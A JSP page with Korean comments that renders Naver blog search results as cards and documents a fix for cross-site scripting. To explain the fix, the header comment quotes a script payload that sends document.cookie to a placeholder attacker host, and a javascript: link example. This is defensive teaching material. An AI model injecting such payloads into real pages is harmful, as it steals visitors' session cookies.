<%@page import="org.json.simple.JSONArray"%>
<%@page import="org.json.simple.JSONObject"%>
<%@page import="org.json.simple.parser.JSONParser"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>

<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ taglib uri="http://java.sun.com/jsp/jstl/fmt" prefix="fmt" %>

<%--
 ================================================================================
   SearchResult.jsp  -  네이버 블로그 검색 결과 (상단 검색창 -> /Car/NaverSearchAPI.do)

   [6단계 전면 재작성 + 보안 수정]

   ------------------------------------------------------------------------------
   ★ 가장 중요한 수정 : 외부에서 받아온 값을 그대로 화면에 출력했다

     (기존 코드)
         <td align="center"><%= object.get("title") %\></td>
         <td align="center"><%= object.get("description") %\></td>
         <a href="<%= object.get("link") %\>">바로가기</a>

     이 값들은 우리 DB 가 아니라 네이버 API 응답, 즉 "남이 쓴 블로그 제목"이다.
     우리가 검증한 적이 없는 값을 HTML 한가운데에 그대로 붙여 넣고 있었다.

     왜 위험한가
       블로그 제목에 아래처럼 적어둔 사람이 있으면 그대로 실행된다.
           <script>fetch('http://공격자/?c='+document.cookie)</script>
       link 값도 마찬가지다. javascript:alert(1) 같은 주소가 들어오면
       "바로가기"를 누른 사람의 브라우저에서 그 코드가 실행된다.

       "설마 네이버가 그런 값을 주겠나" 라고 생각하기 쉽지만,
       그 제목을 정하는 사람은 네이버가 아니라 블로그를 쓴 아무개다.
       외부에서 들어온 값은 전부 "믿을 수 없는 값"으로 취급하는 것이 원칙이다.

     (지금)
       - 제목 / 요약 / 블로거명 : HtmlUtil.escape 로 무해하게 바꾼 뒤 출력
       - 검색어 강조(<b>)만 예외로 다시 살린다 (아래 highlight 메소드 참고)
       - link : http:// 또는 https:// 로 시작하는 주소만 링크로 만든다
       - target="_blank" 에는 rel="noopener noreferrer" 를 함께 붙인다
         (새 창이 window.opener 로 우리 페이지를 조작하는 것을 막는다)

   ------------------------------------------------------------------------------
   ★ 두 번째 수정 : 5칸 표라서 스마트폰에서 볼 수 없었다

     <table width="100%" border="1"> + <td align="center"> 구조였다.
     요약 내용이 긴 칸이 있어 좁은 화면에서는 글자가 한 줄에 한 자씩 쌓였다.

     -> 검색 결과 1건 = 카드 1개 로 바꿨다.
        제목 -> 요약 -> 블로거명 / 날짜 순서로 위에서 아래로 읽는다.

   ------------------------------------------------------------------------------
   ★ 그 외
     - 20241021 -> 2024.10.21 (읽을 수 있는 날짜)
     - 검색 결과가 없을 때 안내 문구 표시 (기존에는 빈 표만 나왔다)
     - 예시 JSON 200줄을 주석으로 붙여두었던 것을 8줄 요약으로 줄였다
 ================================================================================
--%>

<%!
	/*
	 이 화면에서만 쓰는 도우미 메소드 두 개.
	 <%! %\> 는 선언부(declaration)로, 서블릿의 "메소드"가 되는 자리다.
	 (스크립틀릿 <% %\> 은 메소드 "안"의 코드가 된다)
	*/

	/**
	 * 네이버가 검색어를 <b>...</b> 로 감싸 보내준다.
	 * 전체를 이스케이프하면 이 강조도 &lt;b&gt; 라는 글자로 보이므로,
	 * 이스케이프를 먼저 하고 <b> 태그만 다시 살려낸다.
	 *
	 * 순서가 중요하다.
	 *   (1) 먼저 전부 무해하게 바꾼다      -> <script> 도 &lt;script&gt; 가 된다
	 *   (2) 그 다음 &lt;b&gt; 만 되살린다  -> 되살리는 대상이 <b>, </b> 두 개뿐이라 안전하다
	 * 반대로 하면(살리고 나서 이스케이프) 아무 의미가 없다.
	 */
	private String highlight(Object raw) {
		String safe = util.HtmlUtil.escape(raw == null ? "" : raw.toString());
		return safe.replace("&lt;b&gt;", "<b class=\"kw\">")
		           .replace("&lt;/b&gt;", "</b>");
	}

	/**
	 * 20241021 -> 2024.10.21
	 * 형식이 다르면 손대지 않고 그대로 돌려준다 (API 응답 형식이 바뀌어도 화면이 깨지지 않게).
	 */
	private String prettyDate(Object raw) {
		String d = (raw == null) ? "" : raw.toString().trim();
		if (d.length() != 8) {
			return util.HtmlUtil.escape(d);
		}
		return d.substring(0, 4) + "." + d.substring(4, 6) + "." + d.substring(6, 8);
	}

	/**
	 * 링크로 만들어도 되는 주소인지 확인한다.
	 * http:// 또는 https:// 로 시작하지 않으면 링크를 만들지 않는다.
	 * (javascript: , data: 로 시작하는 주소를 href 에 넣으면 클릭 시 코드가 실행된다)
	 */
	private String safeLink(Object raw) {
		if (raw == null) {
			return null;
		}
		String url = raw.toString().trim();
		if (!url.startsWith("http://") && !url.startsWith("https://")) {
			return null;
		}
		return util.HtmlUtil.escape(url);
	}
%>

<%
	request.setCharacterEncoding("UTF-8");

	//CarController 가 request 에 담아준 검색 결과(JSON 형태의 문자열)
	String data = (String)request.getAttribute("searchData");

	//사용자가 입력한 검색어 (결과 안내 문구에 보여준다)
	String keyword = request.getParameter("keyword");
	if (keyword == null) {
		keyword = "";
	}

	/*
	 JSON 문자열 -> 객체로 변환  (사용 라이브러리 : json-simple-1.1.1.jar)

	   "{ ... }"  ->  { ... }

	 응답 형태 (필요한 부분만)
	   {
	     "total" : 2228167,
	     "items" : [
	       { "title":"...", "link":"https://...", "description":"...",
	         "bloggername":"...", "bloggerlink":"...", "postdate":"20241016" },
	       ...
	     ]
	   }
	*/
	JSONArray jsonArray = null;
	long total = 0;

	if (data != null && !data.trim().isEmpty()) {
		JSONParser jsonParser = new JSONParser();
		JSONObject jsonObject = (JSONObject)jsonParser.parse(data);

		Object totalObj = jsonObject.get("total");
		if (totalObj instanceof Number) {
			total = ((Number)totalObj).longValue();
		}
		jsonArray = (JSONArray)jsonObject.get("items");
	}

	int count = (jsonArray == null) ? 0 : jsonArray.size();
%>

<div class="container">

	<div class="section-head">
		<span class="section-eyebrow">BLOG SEARCH</span>
		<h2 class="section-heading">블로그 검색 결과</h2>
		<p class="section-desc">
			<% if (!keyword.isEmpty()) { %>
				&#39;<strong><%=util.HtmlUtil.escape(keyword)%></strong>&#39; 검색 결과
			<% } else { %>
				네이버 블로그에서 찾은 결과입니다
			<% } %>
		</p>
	</div>

<% if (count == 0) { %>

	<%-- 결과가 없을 때 : 기존에는 머리글만 있는 빈 표가 나왔다 --%>
	<div class="alert alert-info text-center">
		검색 결과가 없습니다.<br>
		<span class="fs-sm text-muted">검색어를 짧게 줄이거나 다른 낱말로 다시 찾아보세요.</span>
	</div>

<% } else { %>

	<p class="text-muted fs-sm mb-4">
		총 <fmt:formatNumber value="<%=total%>" pattern="#,###"/>건 중 <%=count%>건 표시
	</p>

	<%-- 검색 결과 1건 = 카드 1개. 화면 폭에 따라 1~3열로 자동 배치된다(app.css .search-grid) --%>
	<div class="search-grid">

<%
	for (int i = 0; i < count; i++) {

		JSONObject object = (JSONObject)jsonArray.get(i);

		String title   = highlight(object.get("title"));
		String desc    = highlight(object.get("description"));
		String blogger = util.HtmlUtil.escape(
				object.get("bloggername") == null ? "" : object.get("bloggername").toString());
		String date    = prettyDate(object.get("postdate"));
		String link    = safeLink(object.get("link"));
%>
		<article class="card search-card">

			<h3 class="search-title">
				<% if (link != null) { %>
					<%-- rel="noopener noreferrer" : 새 창이 우리 페이지를 조작하지 못하게 막는다 --%>
					<a href="<%=link%>" target="_blank" rel="noopener noreferrer"><%=title%></a>
				<% } else { %>
					<%=title%>
				<% } %>
			</h3>

			<p class="search-desc"><%=desc%></p>

			<div class="search-meta">
				<span class="search-blogger"><%=blogger%></span>
				<span class="search-date"><%=date%></span>
			</div>

			<% if (link != null) { %>
				<a class="btn btn-outline btn-sm mt-4"
				   href="<%=link%>" target="_blank" rel="noopener noreferrer">블로그에서 보기 &rsaquo;</a>
			<% } %>

		</article>
<%
	}//for 반복문
%>

	</div>

<% } %>

	<div class="text-center mt-8">
		<a class="btn btn-primary" href="<%=request.getContextPath()%>/Car/CarList.do">차량 보고 예약하기</a>
	</div>

</div>
